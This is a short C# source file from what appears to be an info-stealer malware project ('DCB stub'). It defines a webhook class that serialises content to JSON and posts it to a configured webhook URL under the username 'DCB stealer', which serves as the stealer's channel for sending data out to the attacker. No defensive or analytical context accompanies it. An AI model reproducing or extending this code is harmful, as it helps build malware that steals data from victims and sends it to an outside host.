using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace DCB.stub.components
{
    internal class webhook
    {
        private static HttpClient _httpClient = new HttpClient();
        public static bool sendmessage(string content)
        {
            try
            {
                var username = "DCB stealer";
                var payload = new { content, username };
                string jsonpayload = Newtonsoft.Json.JsonConvert.SerializeObject(payload);
                var contentstring = new StringContent(jsonpayload, Encoding.UTF8, "application/json");
                HttpResponseMessage response = _httpClient.PostAsync(Settings.Webhook, contentstring).Result;
                return response.IsSuccessStatusCode;
            }
            catch
            {
                return false;
            }

        }
    }
}
